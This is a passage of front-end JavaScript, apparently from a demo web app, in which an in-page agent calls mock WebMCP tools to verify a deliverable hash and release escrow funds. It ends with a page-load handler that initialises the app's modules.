      appendAssistant(`Cryptographic hash matched (${verifyRes.actualSha256.slice(0, 12)}...). Signing zero-knowledge escrow release proof...`, {
        name: 'zkescrow_verify_deliverable_hash',
        input: {},
        result: verifyRes
      });
      const signRes = await document.modelContext.invokeTool('zkescrow_sign_escrow_release', {
        milestoneId: 'M-1'
      });
      appendAssistant(`Funds released ($${signRes.releasedAmountUsd} USD). Arbiter Signature: ${signRes.arbiterSignature.slice(0, 24)}...`, {
        name: 'zkescrow_sign_escrow_release',
        input: {},
        result: signRes
      });
    } else {
      appendAssistant(`Command received: "${prompt}". Ready to orchestrate across all 20 registered WebMCP tools.`);
    }
  }

  // =========================================================================
  // 9. INITIALIZE EVERYTHING ON DOM LOAD
  // =========================================================================
  window.addEventListener('DOMContentLoaded', () => {
    initWebMCP();
    initTabs();
    initBreachLab();
    initBioSynth();
    initChronoForensic();
    initMetaLoop();
    initZkEscrow();
    initAgentDrawer();
  });
})();
